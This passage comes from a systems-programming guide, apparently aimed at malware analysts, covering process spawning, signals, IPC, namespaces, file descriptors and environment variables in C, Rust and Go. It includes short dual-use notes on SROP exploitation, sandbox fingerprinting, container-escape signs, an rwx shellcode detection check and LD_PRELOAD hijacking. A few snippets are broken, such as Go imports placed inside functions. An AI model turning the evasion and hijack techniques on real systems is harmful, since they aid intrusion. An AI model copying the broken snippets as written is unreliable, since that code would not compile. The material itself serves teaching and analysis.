use nix::sys::signal::{sigaction, SigAction, SigHandler, SaFlags, SigSet, Signal};

fn setup_sigaction() -> Result<(), nix::Error> {
    // Create handler function (must be unsafe fn because of async-signal restrictions)
    extern "C" fn sigsegv_handler(sig: libc::c_int,
                                   info: *mut libc::siginfo_t,
                                   ctx: *mut libc::c_void) {
        // Log to stderr synchronously — write() is async-signal-safe
        let msg = b"SIGSEGV caught\n";
        unsafe { libc::write(2, msg.as_ptr() as _, msg.len()); }
        // Re-raise to get core dump
        unsafe { libc::raise(libc::SIGSEGV); }
    }

    let action = SigAction::new(
        SigHandler::SigAction(sigsegv_handler),
        SaFlags::SA_SIGINFO | SaFlags::SA_RESTART,
        SigSet::empty(),
    );

    unsafe {
        sigaction(Signal::SIGSEGV, &action)?;
    }
    Ok(())
}
```

### 10.7 Reading Process Information in Rust

```rust
use std::fs;
use std::io::{self, BufRead};

fn read_proc_info(pid: u32) {
    // Read process command line
    let cmdline_path = format!("/proc/{}/cmdline", pid);
    if let Ok(content) = fs::read(&cmdline_path) {
        // cmdline is null-separated, not newline-separated
        let args: Vec<&str> = content
            .split(|&b| b == 0)
            .filter(|s| !s.is_empty())
            .map(|s| std::str::from_utf8(s).unwrap_or("<invalid>"))
            .collect();
        println!("cmdline: {:?}", args);
    }

    // Read process status (TracerPid, State, etc.)
    let status_path = format!("/proc/{}/status", pid);
    if let Ok(file) = fs::File::open(&status_path) {
        let reader = io::BufReader::new(file);
        for line in reader.lines().flatten() {
            if line.starts_with("TracerPid:")
                || line.starts_with("State:")
                || line.starts_with("Uid:")
                || line.starts_with("Gid:")
                || line.starts_with("VmRSS:")
            {
                println!("{}", line);
            }
        }
    }

    // Read memory maps
    let maps_path = format!("/proc/{}/maps", pid);
    if let Ok(content) = fs::read_to_string(&maps_path) {
        println!("=== Memory Maps ===");
        for line in content.lines() {
            // Flag rwx mappings (shellcode indicator)
            if line.contains("rwx") {
                println!("[!] RWX region: {}", line);
            }
        }
    }

    // Get current PID / PPID via Rust standard library
    println!("My PID:  {}", std::process::id());
    // PPID requires nix or reading /proc/self/status
}
```

---

## 11. Go Implementation

### 11.1 os/exec Package — Primary Interface

Go's `os/exec` package is idiomatic Go for process spawning. Internally it uses
`syscall.ForkExec` (Unix) or `CreateProcess` (Windows) depending on the platform.

```go
package main

import (
    "bytes"
    "context"
    "fmt"
    "io"
    "os"
    "os/exec"
    "strings"
    "time"
)

func basicExec() {
    // Run synchronously, inherit parent's stdout/stderr
    cmd := exec.Command("/bin/ls", "-la", "/tmp")
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    err := cmd.Run()     // = Start() + Wait()
    if err != nil {
        fmt.Printf("error: %v\n", err)
    }
}

func captureOutput() {
    // Capture stdout and stderr separately
    cmd := exec.Command("/usr/bin/id")
    var stdout, stderr bytes.Buffer
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr

    err := cmd.Run()

    fmt.Printf("stdout: %s\n", stdout.String())
    fmt.Printf("stderr: %s\n", stderr.String())

    // Access exit code
    exitCode := 0
    if exitErr, ok := err.(*exec.ExitError); ok {
        exitCode = exitErr.ExitCode()
    }
    fmt.Printf("exit code: %d\n", exitCode)
}

func captureWithCombined() {
    // Combine stdout + stderr into one stream
    cmd := exec.Command("/bin/sh", "-c", "echo out; echo err >&2")
    combined, err := cmd.CombinedOutput()
    fmt.Printf("combined: %s\n", combined)
    _ = err
}

func asyncSpawn() {
    // Start async, manage manually
    cmd := exec.Command("/bin/sleep", "10")
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr

    if err := cmd.Start(); err != nil {
        fmt.Printf("Start failed: %v\n", err)
        return
    }

    fmt.Printf("child PID: %d\n", cmd.Process.Pid)

    // Non-blocking check (no equivalent to WNOHANG, use goroutine)
    done := make(chan error, 1)
    go func() {
        done <- cmd.Wait()
    }()

    select {
    case err := <-done:
        fmt.Printf("exited: %v\n", err)
    case <-time.After(2 * time.Second):
        fmt.Println("timeout, killing")
        cmd.Process.Kill()
        <-done  // wait for kill to complete
    }
}

func pipeExample() {
    // Write to child stdin, read from child stdout
    cmd := exec.Command("/bin/cat")

    stdin, err := cmd.StdinPipe()
    if err != nil {
        panic(err)
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        panic(err)
    }

    cmd.Start()

    // Write to stdin in goroutine to avoid deadlock
    go func() {
        defer stdin.Close()
        io.WriteString(stdin, "hello from Go\n")
    }()

    // Read from stdout
    output, _ := io.ReadAll(stdout)
    cmd.Wait()

    fmt.Printf("echo'd back: %s\n", output)
}
```

### 11.2 Environment Variable Control

```go
func envControl() {
    cmd := exec.Command("/usr/bin/env")

    // Method 1: inherit parent env + additions
    cmd.Env = append(os.Environ(),
        "CUSTOM_VAR=analyst",
        "DEBUG=1",
    )

    // Method 2: completely explicit environment (no inheritance)
    cmd.Env = []string{
        "PATH=/usr/bin:/bin",
        "HOME=/root",
        "LANG=C",
        "CUSTOM_VAR=value",
    }

    output, _ := cmd.Output()
    fmt.Printf("env output:\n%s\n", output)

    // Reading environment in current process
    home := os.Getenv("HOME")
    fmt.Printf("HOME=%s\n", home)

    // Set in current process (affects current process and children that inherit)
    os.Setenv("MY_VAR", "value")
    os.Unsetenv("SENSITIVE_VAR")

    // Get all env vars
    for _, e := range os.Environ() {
        pair := strings.SplitN(e, "=", 2)
        if len(pair) == 2 {
            fmt.Printf("%s = %s\n", pair[0], pair[1])
        }
    }
}
```

### 11.3 os.Process — Direct Process Management

```go
import "os"

func directProcessManagement() {
    // Find an existing process by PID
    proc, err := os.FindProcess(12345)  // On Unix: always succeeds (no actual check)
    if err != nil {
        panic(err)
    }

    // Send signal
    err = proc.Signal(os.Interrupt)   // SIGINT on Unix, Ctrl+Break on Windows
    err = proc.Signal(os.Kill)        // SIGKILL on Unix (cannot be caught)

    // On Unix, use syscall.Signal for arbitrary signals:
    import "syscall"
    proc.Signal(syscall.SIGTERM)
    proc.Signal(syscall.SIGUSR1)
    proc.Signal(syscall.SIGSTOP)
    proc.Signal(syscall.SIGCONT)

    // Kill is equivalent to Signal(os.Kill)
    proc.Kill()

    // Wait for process state change
    state, err := proc.Wait()
    // state is *os.ProcessState:
    fmt.Printf("PID:       %d\n", state.Pid())
    fmt.Printf("Success:   %v\n", state.Success())
    fmt.Printf("Exited:    %v\n", state.Exited())
    fmt.Printf("Exit code: %d\n", state.ExitCode())
    fmt.Printf("System:    %v\n", state.Sys())       // syscall.WaitStatus on Unix
    fmt.Printf("Usage:     %v\n", state.SysUsage())  // resource.Usage on Unix

    // Type-assert for Unix-specific info
    ws := state.Sys().(syscall.WaitStatus)
    fmt.Printf("Signaled:  %v\n", ws.Signaled())
    if ws.Signaled() {
        fmt.Printf("Signal:    %v\n", ws.Signal())
    }

    // Release resources without waiting (process becomes orphan)
    proc.Release()

    // Get own PID and parent PID
    myPID := os.Getpid()
    myPPID := os.Getppid()
    fmt.Printf("PID=%d PPID=%d\n", myPID, myPPID)
}
```

### 11.4 Unix-Specific Attributes via SysProcAttr

```go
import (
    "os/exec"
    "syscall"
)

func unixSpecificSpawn() {
    cmd := exec.Command("/bin/sh", "-c", "id; ps -o pid,ppid,pgid,sid,comm")

    cmd.SysProcAttr = &syscall.SysProcAttr{
        // Security: run as different user
        Credential: &syscall.Credential{
            Uid: 1000,
            Gid: 1000,
            Groups: []uint32{1000, 4, 27},  // supplementary groups
        },

        // Create new session (like setsid)
        Setsid: true,

        // Set process group (like setpgid)
        Setpgid: true,
        Pgid:    0,   // 0 = child becomes leader of new group

        // Death signal: signal sent to child if parent dies
        // Pdeathsig: syscall.SIGKILL,

        // Linux-specific: clone flags for namespace isolation
        // Creates new namespaces for the child
        Cloneflags: syscall.CLONE_NEWPID | syscall.CLONE_NEWNET,

        // Unshare specific namespaces in child after fork
        // Unshareflags: syscall.CLONE_NEWNS,

        // Do not give child a controlling terminal
        Noctty: true,

        // Foreground process group on terminal
        // Foreground: true,
        // Pgrp: 0,

        // Additional UID/GID mappings for user namespaces
        // UidMappings: []syscall.SysProcIDMap{...},
        // GidMappings: []syscall.SysProcIDMap{...},

        // Ambient capabilities (Linux 4.3+)
        // AmbientCaps: []uintptr{CAP_NET_BIND_SERVICE},
    }

    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}
```

### 11.5 Context-Aware Process Control

```go
import (
    "context"
    "os/exec"
    "time"
    "syscall"
    "fmt"
)

func contextProcess() {
    // Timeout-bounded execution
    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()

    // When context expires, the process receives SIGKILL by default
    cmd := exec.CommandContext(ctx, "/bin/sleep", "30")

    // IMPORTANT: CommandContext sends SIGKILL on cancellation (Linux 5.x+)
    // For graceful shutdown, use custom WaitDelay:
    cmd.WaitDelay = 2 * time.Second  // wait 2s after signal before SIGKILL

    // Override the kill signal (Go 1.20+)
    // The process receives this signal when context expires
    // After WaitDelay, SIGKILL is sent regardless
    cmd.Cancel = func() error {
        return cmd.Process.Signal(syscall.SIGTERM)  // graceful first
    }

    err := cmd.Run()
    if ctx.Err() == context.DeadlineExceeded {
        fmt.Println("process killed due to timeout")
    }
    if err != nil {
        fmt.Printf("error: %v\n", err)
    }
}
```

### 11.6 Signal Handling in Go

Go's signal handling uses channels. Signals are delivered to registered channels
in goroutines, not via OS signal handlers. Internally Go installs SA_SIGINFO
handlers and routes signals through the Go runtime.

```go
import (
    "fmt"
    "os"
    "os/signal"
    "syscall"
)

func signalHandling() {
    // Buffered channel: IMPORTANT — use buffer size >= number of signals
    // to avoid missing signals during handler execution
    sigs := make(chan os.Signal, 5)

    // Register to receive specific signals
    signal.Notify(sigs,
        syscall.SIGTERM,    // graceful shutdown
        syscall.SIGINT,     // Ctrl+C
        syscall.SIGHUP,     // reload config
        syscall.SIGUSR1,    // custom action
        syscall.SIGUSR2,    // custom action
        syscall.SIGCHLD,    // child state change
    )

    // To stop receiving signals on this channel:
    defer signal.Stop(sigs)

    // To reset signal to default OS behavior:
    // signal.Reset(syscall.SIGTERM)

    // To ignore a signal entirely:
    // signal.Ignore(syscall.SIGPIPE)

    // Handle signals in goroutine
    go func() {
        for {
            sig := <-sigs
            switch sig {
            case syscall.SIGTERM:
                fmt.Println("SIGTERM: shutting down gracefully")
                os.Exit(0)
            case syscall.SIGINT:
                fmt.Println("SIGINT: Ctrl+C pressed")
            case syscall.SIGHUP:
                fmt.Println("SIGHUP: reloading configuration")
            case syscall.SIGUSR1:
                fmt.Println("SIGUSR1: toggle debug mode")
            case syscall.SIGUSR2:
                fmt.Println("SIGUSR2: dump state")
            case syscall.SIGCHLD:
                fmt.Println("SIGCHLD: child state change")
            }
        }
    }()

    // Synchronous signal waiting pattern
    quit := make(chan os.Signal, 1)
    signal.Notify(quit, syscall.SIGTERM, syscall.SIGINT)
    <-quit  // block until signal received
    fmt.Println("shutting down...")
}

// Send signal to arbitrary process
func sendSignal(pid int, sig syscall.Signal) error {
    proc, err := os.FindProcess(pid)
    if err != nil {
        return err
    }
    return proc.Signal(sig)
}
```

### 11.7 Low-Level: syscall.ForkExec

For cases requiring direct control over the fork+exec cycle, Go exposes the raw syscall:

```go
import (
    "syscall"
    "fmt"
)

func forkExecDirect() {
    // syscall.ForkExec: performs fork + exec atomically with no goroutine safety issues
    // This is what exec.Command uses internally on Unix

    pid, err := syscall.ForkExec(
        "/bin/ls",                      // path to executable
        []string{"ls", "-la", "/tmp"},  // argv
        &syscall.ProcAttr{
            Dir:   "/",           // working directory
            Env:   []string{"PATH=/usr/bin:/bin", "HOME=/root"}, // envp
            Files: []uintptr{    // file descriptors to pass
                uintptr(syscall.Stdin),   // fd 0
                uintptr(syscall.Stdout),  // fd 1
                uintptr(syscall.Stderr),  // fd 2
            },
            Sys: &syscall.SysProcAttr{
                Setsid: true,
            },
        },
    )
    if err != nil {
        fmt.Printf("ForkExec failed: %v\n", err)
        return
    }
    fmt.Printf("spawned PID: %d\n", pid)

    // Wait for it
    var wstatus syscall.WaitStatus
    syscall.Wait4(pid, &wstatus, 0, nil)

    if wstatus.Exited() {
        fmt.Printf("exit code: %d\n", wstatus.ExitStatus())
    } else if wstatus.Signaled() {
        fmt.Printf("killed by signal: %v\n", wstatus.Signal())
    }
}
```

---

## 12. Inter-Process Communication (IPC)

### 12.1 IPC Mechanisms Overview

```
IPC Mechanism Comparison:

+------------------+----------+--------+---------+----------+------------+
| Mechanism        | Persist? | Net?   | Typed?  | Ordering | Buffer?    |
+------------------+----------+--------+---------+----------+------------+
| Pipe (anon)      | No       | No     | Bytes   | FIFO     | Yes (64KB) |
| Named Pipe (FIFO)| On disk  | No     | Bytes   | FIFO     | Yes        |
| Socket (Unix)    | Yes/No   | Local  | Bytes   | FIFO     | Yes        |
| Socket (TCP/UDP) | No       | YES    | Bytes   | FIFO/dgm | Yes        |
| Shared Memory    | Optional | No     | Raw     | None     | No         |
| Message Queue    | Optional | No     | Typed   | Priority | Yes        |
| Signal           | No       | No     | Integer | No       | Small (64) |
| Semaphore        | Optional | No     | Counter | N/A      | No         |
+------------------+----------+--------+---------+----------+------------+
```

### 12.2 Anonymous Pipes — C, Rust, Go

**C:**
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

/*
 * Pipe layout:
 *
 * Parent         Kernel Pipe Buffer       Child
 * ------         ==================       -----
 * write(fd[1]) --> [buffer 64KB max] --> read(fd[0])
 *
 * fd[0] = read end
 * fd[1] = write end
 *
 * When all write-end FDs closed: read() returns 0 (EOF)
 * When all read-end FDs closed: write() raises SIGPIPE (or EPIPE if ignored)
 */

void pipe_example_c(void)
{
    int pipefd[2];
    pipe2(pipefd, O_CLOEXEC);   /* atomically set close-on-exec */

    if (fork() == 0) {
        /* Child: reader */
        close(pipefd[1]);               /* close write end */
        char buf[256];
        ssize_t n = read(pipefd[0], buf, sizeof(buf) - 1);
        if (n > 0) {
            buf[n] = '\0';
            printf("[child] received: %s\n", buf);
        }
        close(pipefd[0]);
        _exit(0);
    }

    /* Parent: writer */
    close(pipefd[0]);               /* close read end */
    const char *msg = "hello via pipe\n";
    write(pipefd[1], msg, strlen(msg));
    close(pipefd[1]);               /* EOF signal to child */
    wait(NULL);
}
```

**Rust:**
```rust
use std::io::{Read, Write};
use std::os::unix::io::FromRawFd;
use nix::unistd::{pipe2, OFlag};

fn pipe_example_rust() {
    // Create pipe with O_CLOEXEC
    let (read_fd, write_fd) = pipe2(OFlag::O_CLOEXEC).expect("pipe2 failed");

    // Build safe File wrappers around raw fds
    let mut reader = unsafe { std::fs::File::from_raw_fd(read_fd) };
    let mut writer = unsafe { std::fs::File::from_raw_fd(write_fd) };

    let handle = std::thread::spawn(move || {
        let mut buf = String::new();
        reader.read_to_string(&mut buf).unwrap();
        println!("received: {}", buf);
    });

    writer.write_all(b"hello from writer thread\n").unwrap();
    drop(writer);  // close write end -> EOF for reader

    handle.join().unwrap();
}
```

**Go:**
```go
func pipeExampleGo() {
    // Go's io.Pipe is pure in-memory, not a syscall pipe
    r, w := io.Pipe()

    go func() {
        defer w.Close()
        fmt.Fprint(w, "hello from goroutine\n")
    }()

    output, _ := io.ReadAll(r)
    fmt.Printf("received: %s\n", output)

    // For actual OS pipe (passed to child process), use cmd.StdinPipe()
    // or os.Pipe() for raw *os.File handles:
    pr, pw, _ := os.Pipe()
    defer pr.Close()
    defer pw.Close()
    fmt.Fprint(pw, "data to pipe")
    pw.Close()
    data, _ := io.ReadAll(pr)
    fmt.Printf("pipe data: %s\n", data)
}
```

### 12.3 POSIX Shared Memory

```c
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define SHM_NAME    "/my_shm"
#define SHM_SIZE    4096

/*
 * Shared memory layout:
 *
 *  Process A                         Process B
 *  ---------                         ---------
 *  VA range [0x7f..] -----+          VA range [0x7f..] ---+
 *                          |                               |
 *                          v                               v
 *                   +------------------+
 *                   | Physical RAM Page|
 *                   | (kernel-managed) |
 *                   +------------------+
 *  Writes here appear instantly in Process B's mapping.
 *  No syscall needed for transfer — direct memory access.
 *  BUT: MUST synchronize with mutex or semaphore for race safety!
 */

/* Writer process */
void shm_writer(void)
{
    /* Create or open shared memory object */
    int fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0600);
    ftruncate(fd, SHM_SIZE);  /* set size */

    /* Map into virtual address space */
    char *ptr = mmap(NULL, SHM_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_SHARED,   /* changes visible to other processes */
                     fd, 0);

    close(fd);   /* fd no longer needed after mmap */
    strcpy(ptr, "data from writer");
    munmap(ptr, SHM_SIZE);
}

/* Reader process */
void shm_reader(void)
{
    int fd = shm_open(SHM_NAME, O_RDONLY, 0);
    char *ptr = mmap(NULL, SHM_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    close(fd);

    printf("read: %s\n", ptr);

    munmap(ptr, SHM_SIZE);
    shm_unlink(SHM_NAME);  /* delete the shared memory object */
}
```

### 12.4 Unix Domain Sockets (SOCK_STREAM)

Unix domain sockets provide **file-descriptor passing** — a capability no other IPC
mechanism has. This is used by D-Bus, Wayland, container runtimes, and malware that
wants to pass handles between processes.

```c
#include <sys/socket.h>
#include <sys/un.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/* Server side */
void uds_server(const char *sock_path)
{
    int server_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
    struct sockaddr_un addr = { .sun_family = AF_UNIX };
    strncpy(addr.sun_path, sock_path, sizeof(addr.sun_path) - 1);

    unlink(sock_path);  /* remove stale socket file */
    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_fd, 5);

    int client_fd = accept(server_fd, NULL, NULL);

    /* Receive a file descriptor from client (FD passing!) */
    struct msghdr msg = {0};
    char buf[256];
    struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    /* cmsg buffer for the passed FD */
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    recvmsg(client_fd, &msg, 0);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_level == SOL_SOCKET &&
        cmsg->cmsg_type == SCM_RIGHTS) {
        int received_fd;
        memcpy(&received_fd, CMSG_DATA(cmsg), sizeof(int));
        printf("received fd: %d\n", received_fd);
    }

    close(client_fd);
    close(server_fd);
    unlink(sock_path);
}
```

---

## 13. Signal Mechanics

### 13.1 Signal Classification

```
POSIX Standard Signals:

+--------+------+----------+--------+--------------------------------------------+
| Signal | Num  | Default  | Block? | Description                                |
+--------+------+----------+--------+--------------------------------------------+
| SIGHUP |  1   | Term     | Yes    | Terminal hang up / reload config           |
| SIGINT |  2   | Term     | Yes    | Ctrl+C (keyboard interrupt)                |
| SIGQUIT|  3   | Core     | Yes    | Ctrl+\ (quit with core dump)               |
| SIGILL |  4   | Core     | Yes    | Illegal instruction                        |
| SIGTRAP|  5   | Core     | Yes    | Breakpoint / debug trap (ptrace!)          |
| SIGABRT|  6   | Core     | Yes    | abort() call / assert failure              |
| SIGBUS |  7   | Core     | Yes    | Bus error (misaligned memory access)       |
| SIGFPE |  8   | Core     | Yes    | FP exception / integer divide by zero      |
| SIGKILL|  9   | Term     | NO     | Unconditional kill (cannot be caught!)     |
| SIGUSR1| 10   | Term     | Yes    | User-defined signal 1                      |
| SIGSEGV| 11   | Core     | Yes    | Segmentation fault                         |
| SIGUSR2| 12   | Term     | Yes    | User-defined signal 2                      |
| SIGPIPE| 13   | Term     | Yes    | Write to broken pipe                       |
| SIGALRM| 14   | Term     | Yes    | Timer alarm (from alarm() syscall)         |
| SIGTERM| 15   | Term     | Yes    | Polite termination request (default kill)  |
| SIGCHLD| 17   | Ign      | Yes    | Child state change (exit, stop, continue)  |
| SIGCONT| 18   | Cont     | Yes    | Continue stopped process                   |
| SIGSTOP| 19   | Stop     | NO     | Stop process (cannot be caught!)           |
| SIGTSTP| 20   | Stop     | Yes    | Ctrl+Z (keyboard stop, can be caught)      |
| SIGWINCH| 28  | Ign      | Yes    | Terminal window size change                |
+--------+------+----------+--------+--------------------------------------------+
Real-Time Signals: SIGRTMIN (34) through SIGRTMAX (64)
  - Queue (multiple instances stack up), never merged
  - Carry additional data (siginfo value field)
  - Used by pthreads, timers, I/O completion notifications
```

### 13.2 Signal Delivery Architecture

```
                signal source
                     |
          +----------+----------+
          |          |          |
     kill(pid,sig)  SIGSEGV    Ctrl+C
     tgkill()       SIGFPE     Ctrl+\
     alarm()        SIGILL     terminal
     ptrace         hardware   driver
          |          |          |
          v          v          v
    +------------------------------------------+
    |           KERNEL SIGNAL PATH             |
    |                                          |
    | 1. Kernel sets bit in process's          |
    |    pending signal bitmap                 |
    |    (task_struct->pending.signal)         |
    |                                          |
    | 2. At next kernel-to-user transition:    |
    |    - After syscall return                |
    |    - After interrupt handler             |
    |    - At scheduler preemption             |
    |                                          |
    | 3. Kernel checks:                        |
    |    signal pending? -> signal blocked?    |
    |    Yes pending, Not blocked: deliver it  |
    |                                          |
    | 4. Delivery:                             |
    |    - SIG_DFL: kernel performs default    |
    |    - SIG_IGN: kernel discards            |
    |    - handler: kernel sets up signal      |
    |      frame on user stack, sets RIP to    |
    |      handler function, returns to user   |
    +------------------------------------------+
                     |
                     v
          User-space handler runs
          (at signal frame on stack)
                     |
                     v
          sigreturn() syscall invoked
          (handler ret triggers it via trampoline)
                     |
                     v
          Kernel restores original register state
          from signal frame (ucontext_t)
                     |
                     v
          Process resumes at interrupted instruction
```

### 13.3 Signal Stack Frame (x86-64 Linux)

When the kernel delivers a signal with a user handler, it constructs this frame
on the user stack BEFORE jumping to the handler:

```
    Stack pointer BEFORE signal:
    +---------------------------+
    |   ... normal stack ...    |
    +---------------------------+  <--- RSP (normal execution)
    |                           |
    v (stack grows down)        |
    +---------------------------+
    |   siginfo_t               |  128 bytes: signal info
    |   (si_signo, si_code,     |
    |    si_pid, si_addr, ...)  |
    +---------------------------+
    |   ucontext_t              |  saved machine state:
    |   (uc_mcontext:           |  - all GPRs (rax-r15)
    |    rax, rbx, ..., r15,    |  - rip (where to resume)
    |    rip, rsp, rflags,      |  - rsp (stack at interrupt)
    |    xmm0-xmm15,            |  - rflags
    |    ...)                   |  - FP/SSE state
    +---------------------------+
    |   trampoline code or      |  __kernel_sigreturn address
    |   pointer to vdso         |  (sa_restorer)
    +---------------------------+
    |   signal handler called   |  RSP now here, RDI=signo,
    |   with RIP = handler addr |  RSI=siginfo*, RDX=ucontext*
    +---------------------------+
```

**Exploit relevance**: Buffer overflow + signal handler return address = code execution.
The `sigreturn` syscall reads ALL registers from the stack frame — SROP
(Sigreturn-Oriented Programming) exploits this by forging a ucontext_t on the stack
to set arbitrary register values when sigreturn is called.

---

## 14. Process Namespaces and Isolation

Linux namespaces provide isolation for specific OS resources. They are the primitive
that containers (Docker, LXC, Kubernetes) are built on.

### 14.1 Namespace Types

| Namespace | Flag          | Isolates                                               |
|-----------|---------------|--------------------------------------------------------|
| UTS       | CLONE_NEWUTS  | Hostname and domain name (each NS has its own)        |
| IPC       | CLONE_NEWIPC  | SysV IPC, POSIX message queues                        |
| PID       | CLONE_NEWPID  | Process IDs (PID 1 = init of namespace)               |
| Net       | CLONE_NEWNET  | Network stack (interfaces, routing, firewall rules)   |
| Mount     | CLONE_NEWNS   | Filesystem mount points                               |
| User      | CLONE_NEWUSER | UID/GID mappings (unprivileged containers)            |
| Cgroup    | CLONE_NEWCGROUP | cgroup root                                          |
| Time      | CLONE_NEWTIME | System clocks (boottime, monotonic)                   |

### 14.2 Creating Isolated Processes in C

```c
#include <sched.h>      /* clone() */
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define STACK_SIZE (1024 * 1024)  /* 1MB stack for clone() */

static int isolated_child(void *arg)
{
    /* Inside PID namespace: we are PID 1! */
    printf("[isolated] my PID = %d\n", getpid());     /* prints 1 */
    printf("[isolated] my hostname = ...\n");
    /* sethostname("isolated-host", 13); */
    return 0;
}

void create_isolated_process(void)
{
    char *stack = malloc(STACK_SIZE);
    char *stack_top = stack + STACK_SIZE;  /* stack grows down */

    pid_t pid = clone(
        isolated_child,
        stack_top,
        CLONE_NEWPID     /* new PID namespace */
        | CLONE_NEWUTS   /* new UTS namespace */
        | CLONE_NEWNET   /* new network namespace */
        | CLONE_NEWNS    /* new mount namespace */
        | SIGCHLD,       /* signal to send parent on child exit */
        NULL             /* argument to isolated_child */
    );

    printf("[parent] child namespace PID = %d\n", pid);  /* prints actual PID */
    waitpid(pid, NULL, 0);
    free(stack);
}
```

### 14.3 Namespace Relevance for Malware Analysis

- **Container escape detection**: A malware sample running inside a container has
  limited PID and network namespaces. If it attempts to access `/proc/1/ns/` to
  identify it's containerized and then tries `unshare()` or writes to
  `/proc/sys/kernel/ngroups_max`, it's attempting container escape.
- **Namespace enumeration**: `/proc/PID/ns/` directory contains symlinks like
  `pid -> pid:[4026531836]`. Processes sharing the same namespace inode number
  are in the same namespace. This lets you determine if a process is containerized.
- **PID namespace tricks**: Some sandbox detection code checks if `getpid()` returns
  1 (would happen inside a PID namespace with a single process). Cuckoo and similar
  sandboxes that use namespaces for isolation can be fingerprinted this way.

---

## 15. File Descriptor Inheritance

Understanding FD inheritance is critical for:
1. Preventing FD leaks into untrusted child processes
2. Redirecting I/O for process piping
3. Understanding what child processes can see/access

### 15.1 FD Inheritance Rules

```
fork():
  - Child inherits ALL FDs (including sockets, pipes, files)
  - Parent and child share the same underlying file descriptions
    (offset position, access flags are shared!)
  - Changes to file position in child affect parent's view

exec():
  - FDs WITHOUT O_CLOEXEC / FD_CLOEXEC survive exec
  - FDs WITH O_CLOEXEC are atomically closed at exec
  - This is why you should ALWAYS set O_CLOEXEC on sockets/pipes
    you don't want to leak to exec'd processes

Best practices for FD management:
  - Open sockets/files with O_CLOEXEC from the start (pipe2, socket+SOCK_CLOEXEC)
  - In pre-exec child: close FDs you don't want child to have
  - Use dup2() to remap FDs (stdin=0, stdout=1, stderr=2) before exec
```

```c
#include <fcntl.h>
#include <unistd.h>

/* Close all file descriptors above 2 (stdin/stdout/stderr) */
void close_excess_fds(void)
{
    long maxfd = sysconf(_SC_OPEN_MAX);

    /* Method 1: iterate (works everywhere) */
    for (int fd = 3; fd < maxfd; fd++) {
        close(fd);  /* returns -1 with EBADF if not open, ignore */
    }

    /* Method 2: use /proc/self/fd (faster, lists only open FDs) */
    DIR *dir = opendir("/proc/self/fd");
    if (dir) {
        int dirfd_num = dirfd(dir);
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            int fd = atoi(entry->d_name);
            if (fd > 2 && fd != dirfd_num)
                close(fd);
        }
        closedir(dir);
    }
}

/* Set close-on-exec flag on existing FD */
void set_cloexec(int fd)
{
    int flags = fcntl(fd, F_GETFD);
    fcntl(fd, F_SETFD, flags | FD_CLOEXEC);
}
```

---

## 16. Environment Variables

### 16.1 How Environment Works at the Kernel Level

```
execve(path, argv, envp):
               |
               v
  +------------------------------------------+
  | Kernel copies envp[] to new process stack |
  | Layout on stack (high to low):            |
  |                                           |
  |   [AT_NULL]     <- end of aux vector      |
  |   [aux vectors] <- ELF aux info           |
  |   0             <- end of envp            |
  |   envp[n-1]     <- last env string ptr    |
  |   ...                                     |
  |   envp[1]       <- "HOME=/root"           |
  |   envp[0]       <- "PATH=/usr/bin:/bin"   |
  |   0             <- end of argv            |
  |   argv[argc-1]  <- last arg ptr           |
  |   ...                                     |
  |   argv[0]       <- program name ptr       |
  |   argc          <- argument count         |
  |   <RSP>         <- initial stack pointer  |
  +------------------------------------------+
  
  The actual string data is stored above these arrays
  at higher addresses on the initial stack.
```

**C:**
```c
/* Global: char **environ — pointer to current env */
extern char **environ;

/* Read a variable */
const char *path = getenv("PATH");   /* NULL if not set */

/* Set or modify */
setenv("MY_VAR", "value", 1);        /* 1 = overwrite if exists */
setenv("NEW_VAR", "new", 0);         /* 0 = don't overwrite */

/* Set with "NAME=VALUE" string (pointer stored directly — careful!) */
putenv("MY_VAR=value");              /* WARNING: string must persist! */

/* Remove */
unsetenv("SENSITIVE_VAR");

/* Clear all */
clearenv();

/* Iterate all variables */
for (char **env = environ; *env != NULL; env++) {
    printf("%s\n", *env);    /* "KEY=VALUE" format */
}
```

**Rust:**
```rust
use std::env;

fn env_manipulation() {
    // Read
    let path = env::var("PATH").unwrap_or_else(|_| String::from("not set"));
    let home = env::var_os("HOME");  // returns OsString, handles non-UTF8

    // Set (affects current process and future children)
    env::set_var("MY_VAR", "value");
    env::remove_var("SENSITIVE_VAR");

    // Iterate
    for (key, val) in env::vars() {
        println!("{}={}", key, val);
    }
    // env::vars_os() for non-UTF8 safe iteration

    // Get program arguments
    let args: Vec<String> = env::args().collect();
    println!("argv[0] = {}", args[0]);
}
```

**Go:**
```go
import (
    "os"
    "strings"
)

func envGo() {
    // Read
    path := os.Getenv("PATH")                  // "" if not set
    home, exists := os.LookupEnv("HOME")       // returns (val, bool)

    // Set/Remove
    os.Setenv("MY_VAR", "value")
    os.Unsetenv("SENSITIVE_VAR")
    os.Clearenv()

    // Iterate
    for _, e := range os.Environ() {
        parts := strings.SplitN(e, "=", 2)
        key, val := parts[0], parts[1]
        _ = key; _ = val
    }
}
```

### 16.2 Malware Abuse of Environment Variables

| Technique | Variable | Effect |
|-----------|----------|--------|
| LD_PRELOAD hijack | `LD_PRELOAD=/path/to/evil.so` | Injected library loaded first |
| LD_LIBRARY_PATH | `LD_LIBRARY_PATH=/tmp` | Hijack .so search order |
